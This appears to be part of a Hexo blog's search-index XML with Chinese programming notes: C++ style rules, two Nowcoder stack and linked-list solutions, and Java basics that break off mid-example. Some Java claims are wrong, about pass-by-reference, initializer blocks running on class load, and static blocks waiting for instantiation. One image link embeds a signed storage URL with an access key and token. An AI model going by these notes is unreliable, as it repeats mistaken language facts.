src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E8%A7%84%E8%8C%83%E4%BB%A3%E7%A0%81.png?q-sign-algorithm=sha1&q-ak=AKID62gNbIugj-rlltKDtx9qQ0_NXvaVQ5eNhwwxGkulFmHBe0ryycrOgtLN1PJ48AwE&q-sign-time=1681488019;1681491619&q-key-time=1681488019;1681491619&q-header-list=host&q-url-param-list=&q-signature=e4a689d272023a355d0531e4c2a8e304b91e3f84&x-cos-security-token=0TXuI2oo8Sb5JGse9bsw7agND0rUgf7ab53099746c0362b69c92e54403bee6c1Ar87iX4JGt_CJ_4-yiOqn5qq0oYOzq5Mvx5tZYU4UMH4CzPOLXAXckkgflDKpLF8EFsMkPbIaiZBHDbuZKO7M7wuhqklRkTpvoysQC3p_jlBgtUCJW9hscAxiDk_3qQDgHzlDrdCKzHaDdduRuoDolrxPPI9XoPQLvaqMiBwujWJDhXsHm8ruOPtekvK2ev8" style="zoom:150%;" /></li></ol><h3 id="注释的使用"><a href="#注释的使用" class="headerlink" title="注释的使用"></a>注释的使用</h3><ol><li>版本，版权的说明</li><li>函数接口的说明</li><li>重要代码</li><li>代码即注释</li></ol><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><ol><li><p><code>class</code></p><p>采取大驼峰命名法</p><p>例如<code>MyClass</code></p></li><li><p>函数</p><p>采取驼峰命名</p></li><li><p>也可以在中间添加<code>_</code></p><p><code>creat_func</code>前后都是小写</p></li><li><p>变量命名</p><p>变量的意思</p></li></ol><h3 id="表达式和语句"><a href="#表达式和语句" class="headerlink" title="表达式和语句"></a>表达式和语句</h3><ol><li>添加<code>()</code></li><li>不编写太复杂的表达式</li></ol><h2 id="概念抽象与命名"><a href="#概念抽象与命名" class="headerlink" title="概念抽象与命名"></a>概念抽象与命名</h2><ol><li>类的命名是名词</li><li>函数是动词</li></ol><h2 id="大道至简"><a href="#大道至简" class="headerlink" title="大道至简"></a>大道至简</h2><ol><li>模块复用</li><li>化繁为简</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈的压入和弹出序列</title>
    <link href="/2023/04/13/%E7%AE%97%E6%B3%95/newcoder/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/"/>
    <url>/2023/04/13/%E7%AE%97%E6%B3%95/newcoder/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/d77d11405cc7470d82554cb392585106?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">栈的压入、弹出序列_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97.png"></p><ol><li><p>代码</p><p>方法一</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsPopOrder</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; pushV, vector&lt;<span class="hljs-type">int</span>&gt; popV)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>, n = pushV.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : popV) &#123;<br>            <span class="hljs-keyword">while</span> (j &lt; n &amp;&amp; (stack.<span class="hljs-built_in">empty</span>() || stack.<span class="hljs-built_in">top</span>() != item)) &#123;<br>                stack.<span class="hljs-built_in">push</span>(pushV[j++]);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (stack.<span class="hljs-built_in">top</span>() == item) &#123;<br>                stack.<span class="hljs-built_in">pop</span>();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>方法二（自写）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsPopOrder</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; pushV, vector&lt;<span class="hljs-type">int</span>&gt; popV)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (pushV.<span class="hljs-built_in">size</span>() != popV.<span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; pushV.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">while</span> (i &lt; pushV.<span class="hljs-built_in">size</span>() &amp;&amp;i &gt;= <span class="hljs-number">0</span>&amp;&amp; pushV[i] == popV[j] ) &#123;<br>                pushV.<span class="hljs-built_in">erase</span>(pushV.<span class="hljs-built_in">begin</span>() + i);<br>                i--;<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (popV.<span class="hljs-built_in">size</span>() == j) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure></li><li><p>提示</p><p>方法一：</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97.gif"></p><p>方法二：</p><ol><li>遍历<code>push</code>，如果当发现<code>push</code>的元素与<code>pop</code>的元素相等的话，我们就选择将这个<code>push</code>元素<code>erase</code>,并且将下标往前移动一，也就是<code>i--</code></li><li>如果发现<code>pop</code>也都遍历完了，我们就<code>return</code>成功。如果<code>push</code>的下标超过了<code>push.size()</code>我们就选择<code>return false</code></li></ol></li><li><p>理解</p><p>方法一</p><ul><li><p>确保push遍历完时，还可以遍历pop，所以采取遍历pop的方式</p></li><li><p>借助辅助栈，对比是否出栈的顺序是否一致</p></li><li><p>整体的思路如下</p><p>当push没有遍历完，且栈是空或者栈顶不和pop一致，应该往栈push</p><p>如果发现栈顶的值与pop的一致，应该跳出循环，并将栈顶的元素弹出</p><p>如果当push走完时，栈顶元素不和pop相等则说明不相等</p></li><li><p>当两个vector都遍历完时，则说明序列一致</p></li></ul><p>方法二</p><ul><li>将<code>push</code>拿来遍历，如果push都走完了，我们的<code>pop</code>还没走完就选择<code>return false</code></li><li>如果<code>size</code>都不相等，就像应该直接返回<code>false</code></li></ul></li><li><p>问题</p><p>方法一</p><ul><li><p>如何确保push完全走完</p><blockquote><p>循环遍历pop</p></blockquote></li></ul><p>方法二</p><ul><li><p>如何防止<code>popV</code>越界</p><blockquote><p>使用i&gt;&#x3D;0，如果该条件不满足，则说明已经遍历完成</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>删除链表结点</title>
    <link href="/2023/04/12/%E7%AE%97%E6%B3%95/newcoder/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%BB%93%E7%82%B9/"/>
    <url>/2023/04/12/%E7%AE%97%E6%B3%95/newcoder/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%BB%93%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/f9f78ca89ad643c99701a7142bd59f5d?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">删除链表的节点_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%88%A0%E9%99%A4%E8%8A%82%E7%82%B9.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct ListNode *next;</span><br><span class="hljs-comment"> *  ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstddef&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param head ListNode类</span><br><span class="hljs-comment">     * @param val int整型</span><br><span class="hljs-comment">     * @return ListNode类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        ListNode* dummy=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">-1</span>);<br>        dummy-&gt;next=head;<br>        ListNode* moveNode=dummy;<br>        <span class="hljs-keyword">while</span>(moveNode-&gt;next!=<span class="hljs-literal">nullptr</span>)&#123;<br>            <span class="hljs-keyword">if</span>(moveNode-&gt;next-&gt;val==val)<br>            &#123;<br>                moveNode-&gt;next=moveNode-&gt;next-&gt;next;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            moveNode=moveNode-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummy-&gt;next;<br><br>        <span class="hljs-comment">/*        ListNode* moveNode = head;</span><br><span class="hljs-comment">                ListNode* pre=head;</span><br><span class="hljs-comment">                if(head-&gt;val==val)&#123;</span><br><span class="hljs-comment">                    return head-&gt;next;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                while (moveNode != nullptr) &#123;</span><br><span class="hljs-comment">                    if (moveNode-&gt;val == val) &#123;</span><br><span class="hljs-comment">                        pre-&gt;next=moveNode-&gt;next;</span><br><span class="hljs-comment">                        moveNode = moveNode-&gt;next;</span><br><span class="hljs-comment">                        break;</span><br><span class="hljs-comment">                    &#125;</span><br><span class="hljs-comment">                    pre=moveNode;</span><br><span class="hljs-comment">                    moveNode = moveNode-&gt;next;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                return head;*/</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注释是自己的方法</p></li><li><p>提示</p><ul><li>对来链表操作，或者返回链表的使用虚拟头节点</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java随记</title>
    <link href="/2023/04/12/java/java%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/04/12/java/java%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>java的初始化</p><p>Java的初始化是指在创建对象时为其成员变量设定初值的过程。Java中的所有对象在创建时，其成员变量都会被默认初始化为其对应类型的默认值（如int类型的默认值为0，引用类型的默认值为null）。如果需要对成员变量进行显式初始化，可以通过构造函数、代码块或直接赋值的方式实现。</p><p>构造函数是一种特殊的方法，用于在创建对象时执行一些初始化操作。在Java中，每个类都有一个与之同名的构造函数，可以通过这个构造函数来初始化对象的成员变量。如果没有定义构造函数，Java会提供一个默认构造函数，但是默认构造函数不会做任何事情。</p><p>除了构造函数，Java还提供了代码块的概念。<strong>代码块分为静态代码块和非静态代码块。静态代码块在类加载时执行，非静态代码块在每次创建对象时都会执行。代码块中的语句可以用来初始化成员变量。</strong></p></li><li><p><code>java</code>获得数组的长度使用<code>arr.length</code></p><p>在Java中，数组有一个属性 length，用于表示数组的长度。在本题中，数组 arr 的长度为 10，可以使用 <code>arr.length</code> 来获得数组的长度。注意，这里的 length 不是方法，而是成员变量，因此无需使用括号表示。</p></li><li><p><code>string.concat()</code> 将两个字符串连在一起，返回新的字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;World&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> str1.concat(str2);<br>System.out.println(str3);<br></code></pre></td></tr></table></figure></li><li><p>java什么时候传形参，什么时候传引用？</p><p>在Java中，所有基本类型（如 int、double、boolean 等）都是按值传递的，也就是说，在将基本类型作为参数传递给方法时，实际上传递的是该基本类型的值的副本。任何对这个副本的修改都不会影响到原始的基本类型变量。</p><p>而对于对象类型，Java传递的则是对象引用的副本。对象引用是一个存储在栈内存中的值，它指向堆内存中的一个对象。当将一个对象作为参数传递给方法时，实际上传递的是该对象引用的副本，也就是说，传递的是一个指向原始对象的副本。这种方式称为按引用传递。</p><p>虽然 Java 使用的是按值传递的机制，但因为对象引用传递的实现方式，使得在方法内部可以修改该对象的状态，例如通过调用对象的 setter 方法改变其属性值，或通过调用对象的方法改变其内部状态等。此时，由于传递的是对象的引用，方法内部的修改也会影响原始对象。</p><p>需要注意的是，在 Java 中不支持传递引用的方式，如果想要实现类似 C++ 中的传递引用，则需要使用 Java 的封装类型（例如 Integer、Double、Boolean 等）。这些类型都是对象类型，因此在传递这些类型的变量时，实际上是传递了对象引用的副本，因此也可以在方法内部修改其状态。</p></li><li><p><code>substring(1,5)</code></p><p>获取字符串中第1个元素到到5前一个元素</p></li><li><p>构造方法不能是静态的</p></li><li><p>使用<code>javac</code>将<code>java</code>文件编译成<code>.class</code>文件</p><p>使用<code>java</code> 运行文件</p></li><li><p><code>java</code>代码块</p><ul><li><p>静态代码块</p><p>只在类的加载时执行一次</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span>&#123;<br>    <span class="hljs-comment">//初始化static 变量</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>构造代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-comment">//每次类的加载都会执行</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>局部代码块</p><p>用于限定生命周期</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> func&#123;<br>    &#123;<br>        <span class="hljs-type">int</span> num;<br>        <span class="hljs-comment">//限制num的生命周期</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>同步代码块</p><p>确保线程安全</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">// 同步方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedMethod</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 同步代码块，保证线程安全</span><br>        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>            <span class="hljs-comment">// do something</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>Math类</p><ol><li><code>abs()</code>：返回一个数的绝对值。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>ceil()</code>：返回大于或等于参数的最小整数，即向上取整。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>floor()</code>：返回小于或等于参数的最大整数，即向下取整。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>round()</code>：返回四舍五入后的最接近的整数。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>max()</code>：返回两个值中较大的那个。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>min()</code>：返回两个值中较小的那个。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>pow(double a, double b)</code>：返回a的b次幂。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>sqrt()</code>：返回一个数的平方根。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>sin()</code>：返回一个角度的正弦值。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/sin">2</a>]</li><li><code>cos()</code>：返回一个角度的余弦值。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/cos">2</a>]</li><li><code>tan()</code>：返回一个角度的正切值。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/tan">2</a>]</li><li><code>asin()</code>：返回一个数值的反正弦值（单位为弧度）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/asin">2</a>]</li><li><code>acos()</code>：返回一个数值的反余弦值（单位为弧度）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/acos">2</a>]</li><li><code>atan()</code>：返回一个数值的反正切值（单位为弧度）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/atan">2</a>]</li><li><code>exp()</code>：返回 <code>Math.E</code>（自然对数的底数）的指数。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/exp">2</a>]</li><li><code>log()</code>：返回一个数的自然对数（以e为底数）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/log">2</a>]</li><li><code>random()</code>：返回一个随机数，范围为0到1。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li></ol></li><li><p><code>java</code>使用代码块对static变量进行赋值和直接赋值的区别？</p></li><li><p>执行时机</p><p>直接给static变量赋值时，赋值操作会在类加载时执行，也就是说，当 JVM 加载该类时，就会把static变量的初始值存储到内存中。</p><p>   而代码块则需要等到该类被实例化时才会执行。也就是说，当该类被使用时，代码块中的语句才会执行，从而给static变量赋值。</p></li><li><p>赋值方式</p><p>直接给static变量赋值是一种简单的方式，它可以直接在变量后跟一个等号，然后紧接着赋值的表达式。</p><p>   而代码块提供了更多灵活的赋值方式，我们可以在代码块中编写任意复杂的逻辑来计算出static变量的值，更加符合面向对象的设计思想。</p><p>   综合来看，我们可以根据具体的场景选择不同的方式对static变量进行赋值。如果我们需要简单地给变量赋一个常量值，那么可以直接使用赋值操作；如果我们需要进行一些特殊的计算，或者需要依赖其他变量的值来计算static变量的值，那么可以使用代码块来进行赋值。</p></li><li><p>使用<code>scanner</code>输入字符的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;请输入一个字符：&quot;</span>);<br><span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> scanner.next().charAt(<span class="hljs-number">0</span>);<br>System.out.println(<span class="hljs-string">&quot;您输入的字符是：&quot;</span> + c);<br></code></pre></td></tr></table></figure></li><li><p>关于线程</p><p>多线程是指将CPU资源按时间片分配到多个任务上，看似并行工作，实质上在同一时刻只有一个线程在工作；在一段时间之内，是多个线程在同时工作。</p></li><li><p>不含公共类的文件命名</p><p>不含公共类的Java源文件的命名可以使用任何合法的标识符来命名，但必须以<code>.java</code>文件扩展名结尾。这个文件名称一般会反映该文件中定义的类的用途。</p></li><li><p>在Windows操作系统和Linux操作系统运行的JAVA虚拟机没有什么差别</p></li><li><p>在 Java 中，<code>&amp;&amp;</code> 和 <code>||</code> 是短路逻辑运算符（short-circuit logical operators），而 <code>&amp;</code> 和 <code>|</code> 是非短路逻辑运算符（non-short-circuit logical operators）。</p><p>短路逻辑运算符表示当进行逻辑运算时，如果根据前面的条件可以确定整个表达式的值，后面的条件就不会被判断。例如，对于表达式 <code>A &amp;&amp; B</code>，如果 <code>A</code> 的值为 <code>false</code>，则整个表达式的值一定是 <code>false</code>，因此不会再去判断 <code>B</code> 的值。同理，对于表达式 <code>A || B</code>，如果 <code>A</code> 的值为 <code>true</code>，则整个表达式的值一定是 <code>true</code>，因此不会再去判断 <code>B</code> 的值。</p></li><li><p>Java中二维数组既可以表示m行n列的规则数据，也可以表示多行数据，每一行的列数不相同的不规则数组。</p></li><li><p><code>java</code>不定长度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">average</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>) sum / nums.length;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><code>java </code>栈的相关操作</p><ol><li>push(E item)：将元素item压入栈顶。</li><li>pop()：弹出栈顶元素，并返回该元素。</li><li>peek()：返回当前栈顶元素，但不对栈做任何修改。</li><li>empty()：测试栈是否为空，如果为空返回true，否则返回false。</li><li>search(Object o)：查找元素o在栈中的位置，如果存在返回距离栈顶的位置索引，否则返回-1。</li></ol></li><li><p><code>java</code>枚举<code>enum</code></p><p>用于常量的定义</p></li><li><p><code>substring</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">substring(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p>左闭右开</p><p>从第三个开始，包含第三个，第四个结束不包含第四个</p></li><li><p><code>StringBuffer</code>不能直接给<code>String</code>赋值，必须使用<code>toString()</code></p></li><li><p>常用的Arrays类静态方法有：</p><ul><li>sort方法：对数组进行排序</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>&#125;;<br>Arrays.sort(nums); <span class="hljs-comment">// 对nums数组进行升序排序</span><br>System.out.println(Arrays.toString(nums)); <span class="hljs-comment">// [1, 3, 4]</span><br></code></pre></td></tr></table></figure><ul><li>binarySearch方法：在已排序的数组中查找指定元素并返回其下标</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> Arrays.binarySearch(nums, <span class="hljs-number">3</span>); <span class="hljs-comment">// 在nums数组中查找数字3</span><br>System.out.println(index); <span class="hljs-comment">// 2，即数字3在数组中的下标为2</span><br></code></pre></td></tr></table></figure><ul><li>equals方法：比较两个数组是否相等</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] b = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isEqual</span> <span class="hljs-operator">=</span> Arrays.equals(a, b); <span class="hljs-comment">// 判断a和b数组是否相等</span><br>System.out.println(isEqual); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>fill方法：将数组全部填充为指定值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>Arrays.fill(nums, <span class="hljs-number">4</span>); <span class="hljs-comment">// 将nums数组全部填充为数字4</span><br>System.out.println(Arrays.toString(nums)); <span class="hljs-comment">// [4, 4, 4, 4, 4]</span><br></code></pre></td></tr></table></figure><ul><li>copyOf方法：复制一个数组的一部分或全部到一个新数组中</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] b = Arrays.copyOf(a, <span class="hljs-number">3</span>); <span class="hljs-comment">// 复制a数组的前3个元素到b数组中</span><br>System.out.println(Arrays.toString(b)); <span class="hljs-comment">// [1, 